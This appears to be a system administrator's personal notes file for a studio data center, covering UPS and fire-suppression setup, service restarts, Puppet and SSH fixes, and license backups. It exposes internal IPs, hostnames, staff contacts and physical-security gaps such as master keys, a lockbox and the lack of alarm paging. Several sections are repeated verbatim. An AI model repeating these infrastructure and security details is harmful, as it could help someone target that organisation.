There is only one string of batteries. Data Center team has ownership of this. The UPS was maintained by Fakouri Electrical Engineering when 
we started. Maintenance schedules were quarterly, semi and annual. The goal when Dave Flynn left was to acquire a second string of batteries 
and a generator but there was no space or budget. Batteries were last replaced in the fall of 2014 when we started. Note that there is an AC 
unit near the entrance that leaks. Because there is no water detection cable, there have been times where there has been water in the room. The 
UPS brand is Eaton. On the display you can review the log history. Two second brown outs are considered normal Glendale but I think this might 
of subsided. However, theater projector booths were put on the UPS as a result. Outlets, projectors, switches and voip have about 30 minutes 
to 1 hour of battery power. 

Cellwatch is the monitoring system for the UPS. However, there is no alarming or paging function.  November 2015 - set up monitor, keyboard, 
mouse and table next to UPS system.  IP 10.103.156.118.  Odyssey Power set up to do maintenance on system and reconfigured.  Ethernet cable 
is hand labeled dts-batmon.

There are 2 fire sprinkler sets in the room, water and inergen. The inergen exhaust vent is located about the center light. There are smoke 
detectors in the plenum. The Vesda system is to help suppress smoke in a cold room. The system is located against the wall near the entrance. 
Nothing is needed from the Data Center team except to make sure the green lights are on.  The inergen canisters in the Data Center are 
maintained yearly by DPSI.

All the CDUs are 3phase and are placed above the rack. These were purchased from Starline Power.

The AC units are 2 / 20 ton units. Every Tuesday morning at 10AM one switches off to run at a time.

Steve mentioned there was a lockbox set up somewhere so DTS should get their hands on a master just like us.  

DTS-CELLWATCH.swna.wdpr.disney.com (10.103.156.118)


****************From Krystle:
Per CORE and SAS security. We would still be able to gain access to the building during a power outage, for about 5-8 hours, depending on the 
outage. All of their access control power supplies have a battery backup and the controller will cache the card holders credentials. 

In addition, ops and security have a master key to doors. 


****************From Grace:
Entire DC is backed up by a UPS. Currently, there is no way of telling what our runtime is.  

Theater room projector booths have their own UPS. 

We dont have a generator.

IDF closets are UPS protected. It is separate from the DC UPS. 

We don't have a Data Center runbook (DC power up / shutdown procedure). It's been on our jira backlog for a while now. 

We don't have a paging system if we have UPS failure, water leak, temp, or power failures in the IDF rooms

Right now we only have zabbix for monitoring. What if the power failure came from the rack where zabbix is mounted or if network is down? We 
need to have an external, independent sensor that can page us via sms. 

I have a long list of action items, I'll add them all in Jira. The bottom line is there's a lot to be desired with our current setup, just need 
time and $$. 


@@@ battery monitor URL
http://10.103.156.118/System

((((()))))
22Feb17  Grace   getting S/N from isilon cluster

isi_for_array -s isi_hw_status -i |grep SerNo
((((()))))
27Feb17   RPM build root URL

10.103.156.118.  Odyssey Power set up to do maintenance on system and reconfigured.  Ethernet cable 
is hand labeled dts-batmon.

There are 2 fire sprinkler sets in the room, water and inergen. The inergen exhaust vent is located about the center light. There are smoke 
detectors in the plenum. The Vesda system is to help suppress smoke in a cold room. The system is located against the wall near the entrance. 
Nothing is needed from the Data Center team except to make sure the green lights are on.  The inergen canisters in the Data Center are 
maintained yearly by DPSI.

All the CDUs are 3phase and are placed above the rack. These were purchased from Starline Power.

The AC units are 2 / 20 ton units. Every Tuesday morning at 10AM one switches off to run at a time.

Steve mentioned there was a lockbox set up somewhere so DTS should get their hands on a master just like us.  


****************From Krystle:
Per CORE and SAS security. We would still be able to gain access to the building during a power outage, for about 5-8 hours, depending on the 
outage. All of their access control power supplies have a battery backup and the controller will cache the card holders credentials. 

In addition, ops and security have a master key to doors. 


****************From Grace:
Entire DC is backed up by a UPS. Currently, there is no way of telling what our runtime is.  

Theater room projector booths have their own UPS. 

We dont have a generator.

IDF closets are UPS protected. It is separate from the DC UPS. 

We don't have a Data Center runbook (DC power up / shutdown procedure). It's been on our jira backlog for a while now. 

We don't have a paging system if we have UPS failure, water leak, temp, or power failures in the IDF rooms

Right now we only have zabbix for monitoring. What if the power failure came from the rack where zabbix is mounted or if network is down? We 
need to have an external, independent sensor that can page us via sms. 

I have a long list of action items, I'll add them all in Jira. The bottom line is there's a lot to be desired with our current setup, just need 
time and $$. 

((((()))))
22Feb17  Grace   getting S/N from isilon cluster

isi_for_array -s isi_hw_status -i |grep SerNo
((((()))))

10.103.156.118.  Odyssey Power set up to do maintenance on system and reconfigured.  Ethernet cable 
is hand labeled dts-batmon.

There are 2 fire sprinkler sets in the room, water and inergen. The inergen exhaust vent is located about the center light. There are smoke 
detectors in the plenum. The Vesda system is to help suppress smoke in a cold room. The system is located against the wall near the entrance. 
Nothing is needed from the Data Center team except to make sure the green lights are on.  The inergen canisters in the Data Center are 
maintained yearly by DPSI.

All the CDUs are 3phase and are placed above the rack. These were purchased from Starline Power.

The AC units are 2 / 20 ton units. Every Tuesday morning at 10AM one switches off to run at a time.

Steve mentioned there was a lockbox set up somewhere so DTS should get their hands on a master just like us.  


****************From Krystle:
Per CORE and SAS security. We would still be able to gain access to the building during a power outage, for about 5-8 hours, depending on the 
outage. All of their access control power supplies have a battery backup and the controller will cache the card holders credentials. 

In addition, ops and security have a master key to doors. 


****************From Grace:
Entire DC is backed up by a UPS. Currently, there is no way of telling what our runtime is.  

Theater room projector booths have their own UPS. 

We dont have a generator.

IDF closets are UPS protected. It is separate from the DC UPS. 

We don't have a Data Center runbook (DC power up / shutdown procedure). It's been on our jira backlog for a while now. 

We don't have a paging system if we have UPS failure, water leak, temp, or power failures in the IDF rooms

Right now we only have zabbix for monitoring. What if the power failure came from the rack where zabbix is mounted or if network is down? We 
need to have an external, independent sensor that can page us via sms. 

I have a long list of action items, I'll add them all in Jira. The bottom line is there's a lot to be desired with our current setup, just need 
time and $$. 

((((()))))
??20Feb17  Satellite notes from Grace

DHCP
Candlepin  = subscriptions
Pulp	   = repo mngr
Forman	   = provision

((((()))))
22Feb17  Grace   getting S/N from isilon cluster

isi_for_array -s isi_hw_status -i |grep SerNo
((((()))))
27Feb17 RPMbuild URL for template

http://gitlab/dts/templateproject/tree/master

((((()))))
2Mar17 nvidia version

nvidia-smi

dsiegfriedt@superfortress:~ $ nvidia-smi
Thu Mar  2 16:12:46 2017       
+------------------------------------------------------+                       
| NVIDIA-SMI 352.79     Driver Version: 352.79         |                       
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  Quadro K5200        Off  | 0000:04:00.0      On |                  Off |
| 29%   46C    P0    42W / 150W |    206MiB /  8191MiB |      0%      Default |
+-------------------------------+----------------------+----------------------+
                                                                              
+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID  Type  Process name                               Usage      |
|=============================================================================|
|    0    117003    G   /usr/bin/Xorg                                  124MiB |
|    0    117167    G   gnome-shell                                     62MiB |
+-----------------------------------------------------------------------------+
((((()))))
3Mar17  --siggy RedHat cases need the following to be added (when opening a case)

@@@ in this case it had to be run on chug (as root)

# sosreport

What is a sosreport and how do I create it in Red Hat Enterprise Linux 4.6 and later?
https://access.redhat.com/kb/docs/DOC-3592

[root@chug ~]# ll /var/tmp
total 53220
-rw------- 1 root root     1004 Mar  3 14:03 host_0
-rw------- 1 root root 54483296 Mar  3 14:09 sosreport-dsiegfriedt.01803886-20170303140431.tar.xz
-rw-r--r-- 1 root root       33 Mar  3 14:09 sosreport-dsiegfriedt.01803886-20170303140431.tar.xz.md5

cp /var/tmp/sosreport-dsi* /disney/home/dsiegfriedt
sudo chown dsiegfriedt sosreport-dsi<TAB><CR>

@@@ then attach to RH case

# foreman-debug

Satellite 6: What is foreman-debug and how do I run it?
https://access.redhat.com/solutions/1177823

To upload a tarball to our secure site, please use the -u option.
[root@chug ~]# cp /tmp/foreman-debug-59PHt.tar.xz /disney/home/dsiegfriedt/
sudo chown dsiegfriedt foreman<TAB><CR>

@@@ then attach to RH case

Could you also update the case with a contact name and phone number?

((((()))))
6Mar17  --siggy satellite delete/re-add

RedHat instucted me to remove, by hand, the entry in IPA for any hosts deleted from satellite.
       log in to sattellite
       Hosts -> search for hostname -> checkbox -> Delete -> confirm
((((()))))
^^^^^
Things look back to normal on the socket count.
[10:15]
from sar -n SOCK   @@@ cd /var/log/sa


((((()))))
8Mar17   Amy   mail group listing
Amy Kong
10:40 AM (20 minutes ago)

to Colleen, tech-dev 
Just to spread out the info...

FYI, we have a command line tool on both Mac and Linux that can tell you what google groups you are in and who are in a specific group.

To check the usage and examples:
$ groupinfo

A couple examples:
list all members/owner in the 'sw_dts' group:
  $ groupinfo sw_dts
list only the groups that John Doe is in:
  $ groupinfo jdoe


((((()))))
8Mar17  --siggy satellite deployment logs

/disney/dist/linux/log/base/7WORKSTATION/TUMBL/computenode:

((((()))))
8MAr17  --siggy rtprio real time priorities

ulimit -a (OR -r for just the rprio)

https://access.redhat.com/solutions/61334

	Settings in /etc/security/limits.conf take the following form:
		 *                -       rtprio         99
(((
[root@superfortress limits.d]# cat /etc/security/limits.conf
{SNIP}
#@student        -       maxlogins       4
root             soft    rtprio          99
# End of file
@@@commented out to make it match my machine (dts3329) which has rtprio of 99

dsiegfriedt@dts3329:/etc/security $ cat /etc/security/limits.conf
{SNIP}
#@student        -       maxlogins       4
# End of file
)))

@@@ I had to create this file
(((
dsiegfriedt@dts3329:/etc/security $ cat limits.d/70-rtprio.conf
*                -       rtprio         99
[root@superfortress security]# cat limits.d/70-rtprio.conf 
*                -       rtprio         99
)))

((((()))))

******************************************************************************************************
14Mar17  Joel, Jason Cardella   Fiber map

288 strand loop from 1101 to 1201 routed flower/sonora/airway/grandview

run is in 12 strand tubes

manhole available

when more fiber is needed, in the manhole, a tube is cut/spliced into to create a 24 strand connection back to 1101 and 1201 (divergent paths)

the rooms in 1101 and 1201 are then patched to the HANE room (in 1200 South) 

******************************************************************************************************
27Mar17  --siggy template editing in satellite (from Grace)

Hosts -> Provisioning Templates (DTS PXELinux Default.... appended "biosdevname=0" to the end of "#rhel 7 install" line)

@@@ select the step you want to edit.....

******************************************************************************************************
3Apr17  Chris (Steinke) Pixar network contacts

Network & Server Admins nsa@pixar.com
Tyler Fazakerley faz@pixar.com
Chris Walker cwalker@pixar.com
David Sotnick sotnickd@pixar.com

******************************************************************************************************
4Apr17   Netbox

http://vmnetworkmgr.disneytoonstudios.com/

******************************************************************************************************

——— 8Apr17 ——
end point for VMWare
2 node DEV cluster
2 node DMZ cluster
rest to a production cluster (4)

****   ****

204-core-blade/port

fiber runs for new Isilon nodes:
theorem13  —> 105.1A1—> 205.2D1—> 204-core-3/18
theorem14  —> 105.1A2—> 205.2D2—> 204-core-3/20
theorem15  —> 105.1A3—> 205.2D3—> 204-core-4/18
theorem16  —> 105.1A4—> 205.2D4—> 204-core-4/20

theorem7  —> 102.1-9 -> 205.2A9 -> 204-core-4/6 

theorem99-1 —> 105.2A5 —> 205.2D5 —> 204-core-
theorem99-2 —> 105.2A6 —> 205.2D6 —> 204-core-
theorem99-3 —> 105.2A7 —> 205.2D7 —> 204-core-
theorem99-4 —> 105.2A8 —> 205.2D8 —> 204-core-

theorem99-ether —> 106A1 —> 205E1 —> Where ever it was plugged in when it was connected in rack 102
******************************************************************************************************
13Aapr17  multple machines failing satellite check

bulldog:
puppet agent --test

[root@bulldog ~]# yum update avahi-compat-howl-devel-0.6.31-15.el7_2.1.x86_64 (one of the complaining updates 

There are unfinished transactions remaining. 
    You might consider running yum-complete-transaction
    or yum-complete-transaction --cleanup-only
    and yum history redo last  first to finish them. 

If those don't work you'll have to try removing/installing packages by hand (maybe package-cleanup can help).


******************************************************************************************************
14Apr17  Jenkins errors

email from Neil Barber:
It means the pws (prism web service) is down.  It looks like the box was rebooted and the services never came backup.

ssh pws.disneytoonstudios.com   == vmprism03.disneytoonstudios.com
nbarber@vmprism03:~ $ uptime
 17:28:02 up  1:54,  2 users,  load average: 0.05, 0.03, 0.05

pws is the discovery service used by prism when it's various components start up or when they re-learn cluster information. 
It's critical it continues to run. I'm not sure how much you are using prism over there but, after checking some logs, the 
message broker component is being used by pes. So pws should be considered a critical component.

The web service is managed by supervisor. To start it...

$ sudo service supervisord start (http)

Once I started it back up, I sent a request to http://pws.disneytoonstudios.com/api/config and took a look at what other services 
need to be running on that box (vmprism03)... zookeeper and kafka

$ sudo service zookeeper start
$ sudo service kafka start

All OK now.


11Jan18... @@@ so vmprism03 is the main prism machine all other prism's look to it.... yay its broken

dsiegfriedt@dts3329:~ $ nslookup pws
Server:		10.106.228.19
Address:	10.106.228.19#53

pws.disneytoonstudios.com	canonical name = vmprism03.disneytoonstudios.com.
Name:	vmprism03.disneytoonstudios.com
Address: 10.106.228.72

@@@ different thing needed on different VMs.... (see list below) as of 11Jan18

@@@ on vmprism01 and vmprism02
systemctl status elasticsearch

@@@ on vmprism03
systemctl start httpd
systemctl start supervisord
systemctl start zookeeper
systemctl start kafka

@@@ NO vmprism04

@@@ on vmprism05
systemctl start zookeeper
systemctl start kafka

@@@ on vmprism06
systemctl start zookeeper
systemctl status elasticsearch

@@@ NO vmprism07			3Apr18 removed from /disney/config/prism/site.json

@@@ on vmprism08
systemctl status elasticsearch

@@@ on vmprism09
nothing running

@@@ NO vmprism10			3Apr18 removed from /disney/config/prism/site.json

@@@ on vmprism11
systemctl status zookeeper
systemctl status kafka


&&&&&
@@@ from  http://pws.disneytoonstudios.com/api/config

{"zookeeper": {"nodes": {
"vmprism03.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_1", "id": 1}, 
"vmprism05.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_3", "id": 3}, 
"vmprism07.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_5", "id": 5}, 
"vmprism11.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_2", "id": 6}, 
"vmprism06.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_4", "id": 4}}}, "privateweb": {"nodes": {

"vmprism03.disneytoonstudios.com": {"prism_node_id": "private_web_1", "port": 8000}}}, "publicweb": {"nodes": {}}, "kafka": {"nodes": {"vmprism03.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 0}, 

"vmprism05.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 2}, 

"vmprism11.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 1}}, "zk_chroot": "/kafka"}, "kafka-web-console": {"nodes": {"vmprism05.disneytoonstudios.com": {"prism_node_id": "kafka_console_1"}}}, "elasticsearch": {"cluster.name": "baymax", "discovery.zen.minimum_master_nodes": 2, "_comments": {"kopf": "http://vmprism06.disneytoonstudios.com:9200/_plugin/kopf"}, "nodes": {"vmprism02.disneytoonstudios.com": {"http.enabled": false, "es_heap_size": "16g", "node.master": false, "prism_node_id": "elasticsearch_data_2", "node.data": true}, 

"vmprism07.disneytoonstudios.com": {"http.enabled": true, "es_heap_size": "8g", "node.master": true, "prism_node_id": "elasticsearch_master_2", "node.data": false}, 

"vmprism06.disneytoonstudios.com": {"http.enabled": true, "es_heap_size": "8g", "node.master": true, "prism_node_id": "elasticsearch_master_1", "node.data": false}, 

"vmprism01.disneytoonstudios.com": {"http.enabled": false, "es_heap_size": "16g", "node.master": false, "prism_node_id": "elasticsearch_data_1", "node.data": true}, 

"vmprism08.disneytoonstudios.com": {"http.enabled": true, "es_heap_size": "8g", "node.master": true, "prism_node_id": "elasticsearch_master_3", "node.data": false}}}, "kibana": {"nodes": {"vmprism04.disneytoonstudios.com": {"prism_node_id": "kibana_1"}}}, "storm": {"nodes": {"vmprism10.disneytoonstudios.com": {"nimbus": false}, 

"vmprism09.disneytoonstudios.com": {"nimbus": false}, "vmprism08.disneytoonstudios.com": {"nimbus": true}}, "_comments": {"ui": "http://vmprism08.disneytoonstudios.com:8080"}}}

&&&&&

@@@ NOTES from James 11Jan18

 1 The following need to run on prism:
 2 sudo service supervisord start
 3 sudo service zookeeper start
 4 sudo service httpd start
 5 sudo service kafka start
 6 
 7 To restart prodman @@@ on both (8)
 8 ssh ripslinger/vmprodmanstage
 9 sudo /etc/init.d/prodman restart

@@@ see 3 AND 4Apr18

******************************************************************************************************
17Apr17  Jenkins

ssh vmjenkins

/var/log/jenkins/jenkins.log

http://jenkins.disneytoonstudios.com:8080/
/var/log/prism/prism-pws.log

systemctl status jenkins

ps -fe | grep jenkins

for i in $(seq 1 9); do echo $i; ssh vmprism0$i ls -la /disk1/tmp; echo; done
@@@ looking for 
((((()))))
18Apr17

@@@ Amy showed me where to find the machine "el6" is on
@@@ from error email open jenkins

click "Console Output" => "el6-?" => Configure ... under Host.
@@@ messages has access errors to /disney/users (which is currently an Isilon issue)

((((()))))

@@@from ...api/config I made it more readable in 2 different ways

{"zookeeper": {"nodes": {
	      "vmprism03.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_1", "id": 1}, 
	      "vmprism05.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_3", "id": 3}, 
	      "vmprism04.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_2", "id": 2}, 
	      "vmprism07.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_5", "id": 5}, 
	      "vmprism06.disneytoonstudios.com": {"connect_port": 2181, "prism_node_id": "zookeeper_4", "id": 4}}}, 

"privateweb": {"nodes": {"vmprism03.disneytoonstudios.com": {"prism_node_id": "private_web_1", "port": 8000}}}, 

"publicweb": {"nodes": {}}, "kafka": {"nodes": {
	     "vmprism03.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 0}, 
	     "vmprism05.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 2}, 
	     "vmprism04.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 1}}, 
	     "zk_chroot": "/kafka"}, "kafka-web-console": {"nodes": {
	     "vmprism05.disneytoonstudios.com": {"prism_node_id": "kafka_console_1"}}}, 

"elasticsearch": {"cluster.name": "baymax", "discovery.zen.minimum_master_nodes": 2, "_comments": {"kopf": 
		 "http://vmprism06.disneytoonstudios.com:9200/_plugin/kopf"}, "nodes": {
		 "vmprism02.disneytoonstudios.com": {"http.enabled": false, "es_heap_size": "16g", "node.master": false, "prism_node_id": "elasticsearch_data_2", "node.data": true}, 
		 "vmprism07.disneytoonstudios.com": {"http.enabled": true, "es_heap_size": "8g", "node.master": true, "prism_node_id": "elasticsearch_master_2", "node.data": false}, 
		 "vmprism06.disneytoonstudios.com": {"http.enabled": true, "es_heap_size": "8g", "node.master": true, "prism_node_id": "elasticsearch_master_1", "node.data": false}, 
		 "vmprism01.disneytoonstudios.com": {"http.enabled": false, "es_heap_size": "16g", "node.master": false, "prism_node_id": "elasticsearch_data_1", "node.data": true}, 
		 "vmprism08.disneytoonstudios.com": {"http.enabled": true, "es_heap_size": "8g", "node.master": true, "prism_node_id": "elasticsearch_master_3", "node.data": false}}}, 

"kibana": {"nodes": {"vmprism04.disneytoonstudios.com": {"prism_node_id": "kibana_1"}}}, 

"storm": {"nodes": {
	 "vmprism10.disneytoonstudios.com": {"nimbus": false}, 
	 "vmprism09.disneytoonstudios.com": {"nimbus": false}, 
	 "vmprism08.disneytoonstudios.com": {"nimbus": true}}, "_comments": {"ui": "http://vmprism08.disneytoonstudios.com:8080"}}}

===========================================================================================================

"vmprism01.disneytoonstudios.com": {"http.enabled": false, "elasticsearch_data_1", "node.data": true}, 

"vmprism02.disneytoonstudios.com": {"http.enabled": false, "elasticsearch_data_2", "node.data": true}, 

"vmprism03.disneytoonstudios.com": {"zookeeper_1", "id": 1}, 
"vmprism03.disneytoonstudios.com": {"private_web_1", "port": 8000}}},  #@@@search for pws as prism
"vmprism03.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 0}, 

"vmprism04.disneytoonstudios.com": {"zookeeper_2", "id": 2}, 
"vmprism04.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 1}}, 
"vmprism04.disneytoonstudios.com": {"prism_node_id": "kibana_1"
"vmprism04.disneytoonstudios.com"  #@@@ apache running as apache

"vmprism05.disneytoonstudios.com": {"zookeeper_3", "id": 3}, 
"vmprism05.disneytoonstudios.com": {"prism_node_id": "kafka_1", "id": 2}, 
"vmprism05.disneytoonstudios.com": {"prism_node_id": "kafka_console_1"}}}, 

"vmprism06.disneytoonstudios.com": {"zookeeper_4", "id": 4}
"http://vmprism06.disneytoonstudios.com:9200/_plugin/kopf"}, "nodes": {
"vmprism06.disneytoonstudios.com": {"http.enabled": true "elasticsearch_master_1"

"vmprism07.disneytoonstudios.com": {"zookeeper_5", "id": 5}, 
"vmprism07.disneytoonstudios.com": {"http.enabled": true, "elasticsearch_master_2"

"vmprism08.disneytoonstudios.com": {"http.enabled": true, "elasticsearch_master_3"
"vmprism08.disneytoonstudios.com": {"nimbus": true}},
"http://vmprism08.disneytoonstudios.com:8080"}}}

"vmprism09.disneytoonstudios.com": {"nimbus": false}, 

"vmprism10.disneytoonstudios.com": {"nimbus": false}, 


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

dsiegfriedt@vmprism03:~ $ ps -ef | grep prism
prism    12555  5676  0 Apr16 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND

prism    14644 14643  0 Apr13 ?        00:00:01 python /usr/bin/prism-pws --port=8000 --configfile=/disney/config/prism/site.json --log_file_prefix=/var/log/prism/prism-pws.log

prism    15277     1  0 Apr13 ?        00:02:25 java -Xmx4G -Xms4G -cp /opt/zookeeper/*:/opt/zookeeper/conf:/opt/zookeeper/lib/* org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/conf/zookeeper.properties

prism    27718     1  0 14:43 ?        00:00:09 java -Xmx1G -Xms1G -server -XX:+UseCompressedOops -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+CMSScavengeBeforeRemark -XX:+DisableExplicitGC -Djava.awt.headless=true -Xloggc:/kafkaServer-gc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dlog4j.configuration=file:/opt/kafka/bin/../config/log4j.properties -cp :/opt/kafka/bin/../core/build/dependant-libs-2.8.0/*.jar:/opt/kafka/bin/../perf/build/libs//kafka-perf_2.8.0*.jar:/opt/kafka/bin/../clients/build/libs//kafka-clients*.jar:/opt/kafka/bin/../examples/build/libs//kafka-examples*.jar:/opt/kafka/bin/../contrib/hadoop-consumer/build/libs//kafka-hadoop-consumer*.jar:/opt/kafka/bin/../contrib/hadoop-producer/build/libs//kafka-hadoop-producer*.jar:/opt/kafka/bin/../libs/jopt-simple-3.2.jar:/opt/kafka/bin/../libs/kafka_2.9.2-0.8.1.1.jar:/opt/kafka/bin/../libs/kafka_2.9.2-0.8.1.1-javadoc.jar:/opt/kafka/bin/../libs/kafka_2.9.2-0.8.1.1-scaladoc.jar:/opt/kafka/bin/../libs/kafka_2.9.2-0.8.1.1-sources.jar:/opt/kafka/bin/../libs/log4j-1.2.15.jar:/opt/kafka/bin/../libs/metrics-core-2.2.0.jar:/opt/kafka/bin/../libs/scala-library-2.9.2.jar:/opt/kafka/bin/../libs/slf4j-api-1.7.2.jar:/opt/kafka/bin/../libs/snappy-java-1.0.5.jar:/opt/kafka/bin/../libs/zkclient-0.3.jar:/opt/kafka/bin/../libs/zookeeper-3.3.4.jar:/opt/kafka/bin/../core/build/libs/kafka_2.8.0*.jar kafka.Kafka /opt/kafka/config/kafka.properties

prism    31236  5676  0 Apr16 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
prism    31237  5676  0 Apr16 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
prism    31238  5676  0 Apr16 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
prism    31239  5676  0 Apr16 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
prism    31240  5676  0 Apr16 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND


******************************************************************************************************
17Apr17  puppet stuff

@@@ if puppet agent --test fails with SSL errors
^^^^^

dsiegfriedt@dts3329:~ $ sudo puppet agent --test
Warning: Unable to fetch my node definition, but the agent run will continue:
Warning: SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked
Info: Retrieving pluginfacts
Error: /File[/var/lib/puppet/facts.d]: Failed to generate additional resources using 'eval_generate': SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked
Error: /File[/var/lib/puppet/facts.d]: Could not evaluate: Could not retrieve file metadata for puppet://chug.disneytoonstudios.com/pluginfacts: SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked
Info: Retrieving plugin
Error: /File[/var/lib/puppet/lib]: Failed to generate additional resources using 'eval_generate': SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked
Error: /File[/var/lib/puppet/lib]: Could not evaluate: Could not retrieve file metadata for puppet://chug.disneytoonstudios.com/plugins: SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked
Info: Loading facts
Error: Could not retrieve catalog from remote server: SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked
Warning: Not using cache on failed catalog
Error: Could not retrieve catalog; skipping run
Error: Could not send report: SSL_connect returned=1 errno=0 state=SSLv3 read server session ticket A: sslv3 alert certificate revoked


^^^^^
@@@ for some reason "sudo rm -rfv /var/lib/puppet/ssl/* did not work"
sudo su -
cd /var/lib/puppet/ssl
rm -rfv ./*

ssh chug puppet cert clean dts3329.disneytoonstudios.com

puppet agent --test

******************************************************************************************************
18Apr17  screening room build changes (LINUX-27)

@@@ to find screen resolution
xdpyinfo  | grep dimensions

@@@ to change resolution wdas uses
/usr/bin/gtf x y refresh
@@@ from the request this would be /usr/bin/gtf 2048 1080 48

@@@ on my machine (dts3329)
dsiegfriedt@dts3329:~ $ gtf 2048 1080 48 -f

mode "2048x1080 48.00Hz 32bit (GTF)"
    # PCLK: 144.07 MHz, H: 53.28 kHz, V: 48.00 Hz
    geometry 2048 1080 2048 1080 32
    timings 6941 328 112 26 1 216 3
    hsync low
    vsync high
endmode

dsiegfriedt@dts3329:~ $ gtf 2048 1080 48 -x

  # 2048x1080 @ 48.00 Hz (GTF) hsync: 53.28 kHz; pclk: 144.07 MHz
  Modeline "2048x1080_48.00"  144.07  2048 2160 2376 2704  1080 1081 1084 1110  -HSync +Vsync

@@@ for the audio portion
https://www.freedesktop.org/wiki/Software/PulseAudio/Documentation/User/WhatIsWrongWithSystemWide/

******************************************************************************************************
18Apr17  ECDSA errors logging into some renderfarm machines

dsiegfriedt@dts3329:~ $ ssh d20742
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
5b:86:6b:7f:8a:c3:b6:ab:db:87:34:28:c8:62:4d:87.
Please contact your system administrator.
Add correct host key in /disney/home/dsiegfriedt/.ssh/known_hosts to get rid of this message.
Offending RSA key in /var/lib/sss/pubconf/known_hosts:2
ECDSA host key for d20742 has changed and you have requested strict checking.
Host key verification failed.

@@@ editing known hosts didn't seem to fix it :^(
@@@ as myself
dsiegfriedt@dts3329:~ $ ssh-keygen -R d20742
# Host d20742 found: line 30 type ECDSA
/disney/home/dsiegfriedt/.ssh/known_hosts updated.
Original contents retained as /disney/home/dsiegfriedt/.ssh/known_hosts.old
dsiegfriedt@dts3329:~ $ ssh d20742
Last login: Mon Apr 17 16:57:39 2017 from dts3329.disneytoonstudios.com


ssh-keygen -R <hostname>   @@@ IP didn't work

******************************************************************************************************
21Apr17  Sophos

~/DOCs/NOTES-SOPHOS

******************************************************************************************************
25Apr17   changing grafana parameters  Grace

scripts are in /root/grafana-lics
dipper:/root/grafana-lics
******************************************************************************************************
1May17  which video card you have

lspci -v | grep -i vga

******************************************************************************************************
1May17  DTS AD

@@@ alias for DTSAD = dtsad

rdesktop -g 1800x1000 -a 16 -r sound:local neverbeast

@@@ login as myself Grace set me up as a domain administrator

******************************************************************************************************
4May17  dipper backup script needed (DONE 25May17)

cd /disney/depts/tech/systems/backops/licenses/DIPPER/
mkdir MONTHYEAR
cd /disney/depts/tech/systems/backops/licenses/DIPPER/MONTHYEAR

rsync -a /etc/rc5.d/ etc-rc5.d
rsync -a /opt .
rsync -a /etc/rc.d/init.d rc.d-init.d
rsync -a /root/.ssh root-dot-ssh
rsync -a /usr/autodesk/ usr-autodesk
rsync -a /usr/local/ usr-local
rsync -a /usr/pixologic/ usr-pixologic
rsync -a /var/flexlm/ var-flexlm/
rsync -a /usr/local/tweak usr-local-tweak

@@@we will need something on vmdeadline for those licenses 30May17 DONE

dsiegfriedt@dts3329:~ $ ssh root@vmdeadline cat /root/month*
root@vmdeadline's password: 
#!/bin/bash

cd /disney/depts/tech/systems/backops/licenses/VVMDEADLINE

TODAY=`date +%B%Y`

mkdir $TODAY

cd $TODAY

rsync -a /opt/Thinkbox/License\ Server .

******************************************************************************************************
5May17  compress/backup satellite mongoDB

tar --selinux --create --gzip --file=mongo_data.tar.gz --exclude=mongod.lock /var/lib/mongodb/

******************************************************************************************************

10May17  Gmail

Vault:
https://ediscovery.google.com

Admin:
https://admin.google.com

Hold:
https://support.google.com/vault/answer/2473591
	Matter => Create (button)
	  Create Hold (button)   fill out form {use login name for name of hold}

%%%%%
19Dec17
@@@ from email dated 11May16
https://techweb.disneyanimation.com/docs/DOC-32752

